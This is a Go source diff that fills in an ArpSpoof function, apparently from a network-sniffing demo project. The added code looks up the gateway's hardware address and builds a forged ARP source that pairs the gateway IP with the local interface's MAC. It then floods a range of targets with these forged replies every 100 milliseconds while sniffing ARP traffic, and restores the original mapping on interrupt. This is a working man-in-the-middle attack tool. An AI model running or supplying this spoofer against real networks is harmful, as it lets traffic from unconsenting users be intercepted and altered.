@@ -15,8 +15,8 @@ import (
 	"SafeDp/sniffer/arp_sniff_demo/logger"
 )
 
-func ArpSpoof(DeviceName string, handle *pcap.Handle, target, gateway string) {
-	iFace, err := net.InterfaceByName(DeviceName);
+func ArpSpoof(DeviceName string, handler *pcap.Handle, target, gateway string) {
+	iFace, err := net.InterfaceByName(DeviceName)
 	if err != nil {
 		logger.Log.Fatalf("Could not use interface %s: %v", DeviceName, err)
 	}
@@ -30,14 +30,15 @@ func ArpSpoof(DeviceName string, handle *pcap.Handle, target, gateway string) {
 		if ipnet, ok := addr.(*net.IPNet); ok {
 			if ip4 := ipnet.IP.To4(); ip4 != nil {
 				iFaceAddr = &net.IPNet{
-					IP: ip4,
+					IP:   ip4,
 					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
+				}
+				break
 			}
-			break
 		}
 	}
 	if iFaceAddr == nil {
-		logger.Log.Fatalf("No IPv4 address found for interface %s", DeviceName)
+		logger.Log.Fatal("Could not get interface address.")
 	}
 
 	var targetAddrs []net.IP
@@ -48,7 +49,73 @@ func ArpSpoof(DeviceName string, handle *pcap.Handle, target, gateway string) {
 		}
 		targetAddrs = addrRange.Expand()
 		if len(targetAddrs) == 0 {
-			logger.Log.Fatal("No valid targets given.")
+			logger.Log.Fatalf("No valid targets given.")
 		}
 	}
-	gatewayAddr := net.ParseIP(gateway).To4()
+
+	gatewayIP := net.ParseIP(gateway).To4()
+
+	stop := make(chan struct{}, 2)
+
+	// Waiting for ^C
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt)
+	go func() {
+		for {
+			select {
+			case <-c:
+				logger.Log.Println("'stop' signal received; stopping...")
+				close(stop)
+				return
+			}
+		}
+	}()
+
+	go readARP(handler, stop, iFace)
+
+	// Get original source
+	origSrc, err := arp.Lookup(binary.BigEndian.Uint32(gatewayIP))
+	if err != nil {
+		logger.Log.Fatalf("Unable to lookup hw address for %s: %v", gatewayIP, err)
+	}
+
+	fakeSrc := arp.Address{
+		IP:           gatewayIP,
+		HardwareAddr: iFace.HardwareAddr,
+	}
+
+	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(0.1*1000.0)*time.Millisecond)
+
+	<-cleanUpAndReARP(handler, targetAddrs, origSrc)
+
+	os.Exit(0)
+}
+
+func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
+	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
+	in := src.Packets()
+	for {
+		var packet gopacket.Packet
+		select {
+		case <-stop:
+			return
+		case packet = <-in:
+			arpLayer := packet.Layer(layers.LayerTypeARP)
+			if arpLayer == nil {
+				continue
+			}
+			packet := arpLayer.(*layers.ARP)
+			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
+				continue
+			}
+			if packet.Operation == layers.ARPReply {
+				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
+			}
+			logger.Log.Debugf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation,
+				net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress),
+				net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
+		}
+	}
+}
+
+			
